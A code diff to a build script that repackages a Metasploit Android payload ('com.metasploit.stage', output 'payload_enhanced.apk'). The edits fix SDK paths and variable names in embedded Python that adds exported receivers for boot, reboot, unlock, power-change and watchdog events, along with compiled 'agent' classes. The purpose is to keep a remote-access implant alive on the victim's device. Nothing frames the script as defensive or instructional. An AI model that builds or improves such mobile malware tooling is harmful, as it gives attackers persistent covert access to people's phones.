@@ -35,7 +35,8 @@ OUT="${3:-payload_enhanced.apk}"
 
 ROOT="$(cd "$(dirname "$0")" && pwd)"
 APT="${APKTOOL_JAR:-$ROOT/apktool.jar}"
-BT="${BUILD_TOOLS:-/home/div-admin/Android/Sdk/build-tools/35.0.0}"
+SDK="${ANDROID_HOME:-/home/div-admin/Android/Sdk}"
+BT="${BUILD_TOOLS:-$SDK/build-tools/35.0.0}"
 WORK="$ROOT/.payload-build"
 RAW="$WORK/raw.apk"
 SRC="$WORK/src"
@@ -370,7 +371,7 @@ PY
     echo "  compiling ${#AGENT_FILES[@]} Java sources..."
     "$JH/bin/javac" -source 8 -target 8 \
         -d "$AGENT_CLASSES" \
-        -classpath "$BT/../platforms/android-34/android.jar" \
+        -classpath "$SDK/platforms/android-35/android.jar" \
         "${AGENT_FILES[@]}" >/dev/null 2>&1
 
     # Convert to dex
@@ -431,7 +432,7 @@ def has_component(name):
                 return True
     return False
 
-def attr(name, value):
+def attr(name):
     return '{http://schemas.android.com/apk/res/android}' + name
 
 PKG = 'com.metasploit.stage'
@@ -467,12 +468,12 @@ if not has_component('BootReceiver'):
     r.set(attr('exported'), 'true')
     r.set(attr('directBootAware'), 'true')
     filt = ET.SubElement(r, 'intent-filter')
-    for a in ['android.intent.action.BOOT_COMPLETED',
+    for act_name in ['android.intent.action.BOOT_COMPLETED',
               'android.intent.action.REBOOT',
               'android.intent.action.QUICKBOOT_POWERON',
               'com.htc.intent.action.QUICKBOOT_POWERON']:
         action = ET.SubElement(filt, 'action')
-        action.set(attr('name'), a)
+        action.set(attr('name'), act_name)
 
 # --- UserPresentReceiver ---
 if not has_component('UserPresentReceiver'):
@@ -481,10 +482,10 @@ if not has_component('UserPresentReceiver'):
     r.set(attr('enabled'), 'true')
     r.set(attr('exported'), 'true')
     filt = ET.SubElement(r, 'intent-filter')
-    for a in ['android.intent.action.USER_PRESENT',
+    for act_name in ['android.intent.action.USER_PRESENT',
               'android.intent.action.USER_UNLOCKED']:
         action = ET.SubElement(filt, 'action')
-        action.set(attr('name'), a)
+        action.set(attr('name'), act_name)
 
 # --- PowerReceiver ---
 if not has_component('PowerReceiver'):
@@ -493,10 +494,10 @@ if not has_component('PowerReceiver'):
     r.set(attr('enabled'), 'true')
     r.set(attr('exported'), 'true')
     filt = ET.SubElement(r, 'intent-filter')
-    for a in ['android.intent.action.ACTION_POWER_CONNECTED',
+    for act_name in ['android.intent.action.ACTION_POWER_CONNECTED',
               'android.intent.action.ACTION_POWER_DISCONNECTED']:
         action = ET.SubElement(filt, 'action')
-        action.set(attr('name'), a)
+        action.set(attr('name'), act_name)
 
 # --- WatchdogReceiver ---
 if not has_component('WatchdogReceiver'):
